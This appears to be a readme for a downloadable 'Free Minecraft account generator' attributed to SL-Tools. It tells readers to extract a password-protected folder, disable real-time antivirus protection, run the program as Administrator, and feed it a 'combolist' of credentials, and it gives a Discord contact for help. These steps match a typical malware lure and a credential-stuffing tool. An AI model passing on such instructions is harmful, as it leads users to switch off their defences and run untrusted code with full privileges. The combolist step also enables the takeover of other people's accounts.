Free Minecraft account generator made by #SL-Tools more gens coming up soon

https://github.com/SL-Tools

If password needed its SL-Tools

1. Extract folder to desktop
2. Open/Run without Realtime-Protection on
3. If it doesnt open try running it as Administrator andwait for 3 seconds for it to launch
4. Once ur in drag the txt file named combolist into the executor in the generator en press Launch!!


Enjoy!!!! with any issues DM (0NYX)#8157 copy paste the whole name with the () (0NYX)#8157